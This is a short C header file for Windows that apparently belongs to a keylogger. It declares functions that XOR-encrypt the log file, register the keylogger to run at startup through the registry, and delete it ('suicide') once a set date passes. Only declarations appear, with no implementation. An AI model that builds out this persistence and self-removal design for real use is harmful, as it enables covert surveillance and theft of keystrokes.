#include <Windows.h>

/* Encrypt a given file */
void EncryptFile_XOR(LPCWSTR lpLogFilePath);

/* Will set the keylogger to run at startup by writing to a specific location in registry */
void RegisterToRunAtStartup();

/* Will suicide if a certain date has passed. Returns TRUE if it did suicide, else False */
BOOL CheckAndSuicideIfNeeded();